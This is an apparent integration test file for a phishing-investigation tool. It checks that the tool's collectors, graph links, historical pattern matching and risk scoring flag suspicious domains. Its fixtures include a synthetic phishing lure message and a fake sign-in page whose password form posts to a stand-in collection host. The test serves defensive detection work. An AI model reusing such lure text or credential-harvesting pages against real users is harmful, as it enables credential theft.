"""
Integration test that exercises the real execution path end to end
(collector -> normalization -> pivot engine -> graph -> correlation -> risk
-> explanation -> case storage) using fake, deterministic collectors instead
of real network calls (see TESTING REQUIREMENTS: test the real path, not mocks
that bypass it).

Scenario: a newly-registered domain shares a TLS certificate fingerprint with
a domain from a previously confirmed-malicious case, and VirusTotal flags it.
This exercises historical pattern matching independent of current reputation.
"""

import os
import shutil
import tempfile
import unittest
from unittest import mock

from krisis.ai.explain import Explainer
from krisis.collectors.base import CollectorResult, EvidenceCollector
from krisis.collectors.page_collector import PageCollector
from krisis.core.investigator import Investigator
from krisis.core.models import Entity, Evidence, Independence, Polarity
from krisis.core.pivot_engine import InvestigationBudget
from krisis.memory.case_memory import CaseMemory
from krisis.memory.pattern_memory import PatternMemory
from krisis.memory.storage import Storage

SHARED_CERT = "cert_fingerprint_shared_with_prior_phishing_case"


class FakeDNSCollector(EvidenceCollector):
    name = "dns"
    supports = ("domain",)

    def collect(self, entity: Entity) -> CollectorResult:
        ev = Evidence(
            source=self.name, entity_id=entity.id, signal="a_record",
            value=["185.10.10.20"], evidence_type="infrastructure",
            polarity=Polarity.NEUTRAL, confidence=0.9, independence=Independence.INDEPENDENT,
        )
        return CollectorResult(evidence=[ev], available=True)


class FakeTLSCollector(EvidenceCollector):
    name = "tls"
    supports = ("domain",)

    def collect(self, entity: Entity) -> CollectorResult:
        ev = Evidence(
            source=self.name, entity_id=entity.id, signal="certificate_fingerprint",
            value=SHARED_CERT, evidence_type="infrastructure",
            polarity=Polarity.NEUTRAL, confidence=0.85, independence=Independence.INDEPENDENT,
        )
        return CollectorResult(evidence=[ev], available=True)


class FakeVTCollector(EvidenceCollector):
    name = "virustotal"
    supports = ("domain",)

    def collect(self, entity: Entity) -> CollectorResult:
        # Deliberately CLEAN current reputation — the test is about historical
        # pattern matching catching what current reputation misses.
        ev = Evidence(
            source=self.name, entity_id=entity.id, signal="no_detections",
            value=0, evidence_type="reputation",
            polarity=Polarity.NEUTRAL, confidence=0.3, independence=Independence.INDEPENDENT,
        )
        return CollectorResult(evidence=[ev], available=True)


class FailingWHOISCollector(EvidenceCollector):
    name = "whois"
    supports = ("domain",)

    def collect(self, entity: Entity) -> CollectorResult:
        return CollectorResult(evidence=[], available=False, note="simulated provider outage")


class CleanNothingFoundCollector(EvidenceCollector):
    """Answers successfully but has nothing to report — the normal shape of
    identity_collector/message_collector on an unremarkable artifact. Must be
    counted as checked, not as an unavailable source."""

    name = "identity"
    supports = ("domain",)

    def collect(self, entity: Entity) -> CollectorResult:
        return CollectorResult(evidence=[], available=True, note="no lookalike candidate derived from this name")


class TestInvestigatorIntegration(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.tmpdir, "test.db")
        self.storage = Storage(self.db_path)
        self.pattern_memory = PatternMemory(self.storage)
        self.case_memory = CaseMemory(self.storage, self.pattern_memory)

    def tearDown(self):
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def _investigator(self) -> Investigator:
        return Investigator(
            collectors=[FakeDNSCollector(), FakeTLSCollector(), FakeVTCollector(), FailingWHOISCollector()],
            case_memory=self.case_memory,
            pattern_memory=self.pattern_memory,
            budget=InvestigationBudget(max_depth=2, max_entities=20, max_external_calls=50),
            explainer=Explainer(use_llm=False),
        )

    def test_full_loop_produces_a_case_with_risk_and_explanation(self):
        investigator = self._investigator()
        case, trace = investigator.investigate("suspicious-login.com")

        self.assertIsNotNone(case.risk)
        self.assertTrue(case.explanation)
        self.assertTrue(case.recommendation)
        self.assertGreater(len(case.evidence), 0)
        self.assertGreater(len(case.pivots), 0)
        self.assertGreater(len(trace.steps), 0)

        # provider failure must be recorded, not silently treated as "clean"
        self.assertTrue(any("whois" in f for f in case.provider_failures))

        # case must be retrievable from storage
        stored = self.case_memory.get(case.id)
        self.assertIsNotNone(stored)
        self.assertEqual(stored["seed"], "suspicious-login.com")

    def test_url_seed_connects_to_its_domain_in_the_graph(self):
        # See GRAPH IS PART OF THE REASONING: "URL -> domain" is a required edge,
        # not two unrelated nodes that happen to share a graph.
        investigator = self._investigator()
        investigator.investigate("https://suspicious-login.com/verify")
        graph = investigator.last_graph

        url_entity = next(e for e in graph.entities() if e.type.value == "url")
        domain_entity = next(e for e in graph.entities() if e.type.value == "domain" and e.depth == 0)
        rels = graph.relationships_for(url_entity.id)
        self.assertTrue(
            any(r.relation_type == "has_domain" and r.target_entity_id == domain_entity.id for r in rels),
            "expected a has_domain edge connecting the seed URL to its domain",
        )

    def test_message_seed_connects_to_extracted_url_and_domain(self):
        # See GRAPH IS PART OF THE REASONING: "message -> URL" is a required edge.
        investigator = self._investigator()
        investigator.investigate(
            "Urgent: verify your account at https://suspicious-login.com/verify or it will be suspended"
        )
        graph = investigator.last_graph

        message_entity = next(e for e in graph.entities() if e.type.value == "message")
        url_entity = next(e for e in graph.entities() if e.type.value == "url")

        message_rels = graph.relationships_for(message_entity.id)
        self.assertTrue(
            any(r.relation_type == "mentions" and r.target_entity_id == url_entity.id for r in message_rels),
            "expected a mentions edge connecting the message to the extracted URL",
        )
        url_rels = graph.relationships_for(url_entity.id)
        self.assertTrue(
            any(r.relation_type == "has_domain" for r in url_rels),
            "expected a has_domain edge connecting the extracted URL to its domain",
        )

    def test_pivot_to_ip_and_certificate_creates_graph_relationships(self):
        investigator = self._investigator()
        case, _ = investigator.investigate("suspicious-login.com")
        graph = investigator.last_graph

        ip_entities = [e for e in graph.entities() if e.type.value == "ip"]
        cert_entities = [e for e in graph.entities() if e.type.value == "certificate"]
        self.assertTrue(any(e.value == "185.10.10.20" for e in ip_entities))
        self.assertTrue(any(e.value == SHARED_CERT for e in cert_entities))

        # both should be reachable from the seed domain via a relationship
        seed = next(e for e in graph.entities() if e.depth == 0 and e.type.value == "domain")
        neighbor_values = {n.value for n, _ in graph.neighbors(seed.id)}
        self.assertIn("185.10.10.20", neighbor_values)
        self.assertIn(SHARED_CERT, neighbor_values)

    def test_historical_similarity_detected_despite_clean_current_reputation(self):
        # Seed prior "confirmed malicious" case sharing the same certificate.
        prior = self._investigator()
        prior_case, _ = prior.investigate("known-phishing-domain.com")
        self.case_memory.set_outcome(prior_case.id, "confirmed_malicious")

        # New investigation reuses the same fake collectors -> same shared cert.
        investigator = self._investigator()
        case, _ = investigator.investigate("brand-new-lookalike.com")

        self.assertTrue(case.pattern_matches, "expected a historical pattern match on the shared certificate")
        best = case.pattern_matches[0]
        self.assertEqual(best["prior_outcome"], "confirmed_malicious")
        self.assertGreater(best["similarity"], 0)
        self.assertIsNotNone(case.risk.historical_similarity)

    def test_budget_limits_are_respected(self):
        investigator = self._investigator()
        investigator.budget.max_entities = 2
        investigator.pivot_engine.budget = investigator.budget
        case, _ = investigator.investigate("suspicious-login.com")
        self.assertLessEqual(investigator.budget.entities_investigated, 2)

    def test_collector_that_answers_with_nothing_to_report_is_not_marked_unchecked(self):
        # A source that ran and legitimately found nothing (e.g. no lookalike
        # candidate for this domain) is a real, clean check — not a gap.
        investigator = Investigator(
            collectors=[FakeDNSCollector(), FakeTLSCollector(), FakeVTCollector(), CleanNothingFoundCollector()],
            case_memory=self.case_memory,
            pattern_memory=self.pattern_memory,
            budget=InvestigationBudget(max_depth=2, max_entities=20, max_external_calls=50),
            explainer=Explainer(use_llm=False),
        )
        case, _ = investigator.investigate("suspicious-login.com")
        unavailable = case.risk.uncertainty.get("unavailable_sources", [])
        self.assertNotIn("identity", unavailable)


class FakeURLReputationCollector(EvidenceCollector):
    """Stands in for VirusTotal: clean/neutral, present only so coverage has an
    actual reputation source and the page-collector's independent evidence
    isn't the only source diversity has to work with."""

    name = "virustotal"
    supports = ("url", "domain")

    def collect(self, entity: Entity) -> CollectorResult:
        ev = Evidence(
            source=self.name, entity_id=entity.id, signal="no_detections",
            value=0, evidence_type="reputation",
            polarity=Polarity.NEUTRAL, confidence=0.3, independence=Independence.INDEPENDENT,
        )
        return CollectorResult(evidence=[ev], available=True)


class _FakeHTTPResponse:
    def __init__(self, status_code=200, headers=None, body=b""):
        self.status_code = status_code
        self.headers = headers or {}
        self._body = body
        self.encoding = "utf-8"

    def iter_content(self, chunk_size=8192):
        for i in range(0, len(self._body), chunk_size):
            yield self._body[i : i + chunk_size]

    def close(self):
        pass


def _public_addrinfo(*_a, **_kw):
    return [(2, 1, 6, "", ("93.184.216.34", 0))]


class TestSecuritySignalScenario(unittest.TestCase):
    """End-to-end synthetic phishing scenario, run through the real
    Investigator + real PageCollector (network mocked, nothing else faked
    about the pipeline): a decorated domain redirects cross-domain to a page
    claiming an invented identity ("GlorpTech" — not a real brand), with a
    password field whose form posts to a third, unrelated domain. Exercises
    the full redirect/URL-intent/brand-mismatch/credential-harvesting signal
    chain (krisis/collectors/page_collector.py) plus the risk engine's
    interaction bonus (krisis/core/risk.py::INTERACTION_BONUS_POINTS), and
    proves the combined verdict is *earned* from these evidence items, not
    hardcoded for this or any domain.
    """

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.storage = Storage(os.path.join(self.tmpdir, "test.db"))
        self.pattern_memory = PatternMemory(self.storage)
        self.case_memory = CaseMemory(self.storage, self.pattern_memory)

    def tearDown(self):
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_combined_signals_produce_a_credential_phishing_hypothesis(self):
        redirect = _FakeHTTPResponse(
            status_code=302, headers={"Location": "https://secure-verify-portal.test/login"}
        )
        page = _FakeHTTPResponse(status_code=200, body=(
            '<html><head><meta property="og:site_name" content="GlorpTech">'
            "<title>Sign in - GlorpTech</title></head><body>"
            '<form action="https://collect-data.test/submit" method="post">'
            '<input type="text" name="username">'
            '<input type="password" name="password">'
            "</form></body></html>"
        ).encode("utf-8"))

        investigator = Investigator(
            collectors=[PageCollector(), FakeDNSCollector(), FakeURLReputationCollector()],
            case_memory=self.case_memory,
            pattern_memory=self.pattern_memory,
            # depth 0: only the seed URL/domain are fetched — keeps this test
            # about the seed's own evidence, not the discovered redirect
            # target's follow-on investigation (covered separately).
            budget=InvestigationBudget(max_depth=0, max_entities=20, max_external_calls=50),
            explainer=Explainer(use_llm=False),
        )

        with mock.patch(
            "krisis.collectors.page_collector.socket.getaddrinfo", side_effect=_public_addrinfo
        ), mock.patch("requests.get", side_effect=[redirect, page]):
            case, _trace = investigator.investigate("https://glorptech-login.example/login")

        signals = {e.signal for e in case.evidence.values()}
        for expected in (
            "authentication_intent", "brand_domain_mismatch", "credential_form",
            "external_form_action", "cross_domain_redirect",
        ):
            self.assertIn(expected, signals, f"expected {expected!r} in {sorted(signals)}")

        self.assertIn(case.risk.category.value, ("MEDIUM", "HIGH", "CRITICAL"))
        self.assertTrue(
            any("combined" in c for c in case.risk.top_contributors),
            case.risk.top_contributors,
        )


if __name__ == "__main__":
    unittest.main()
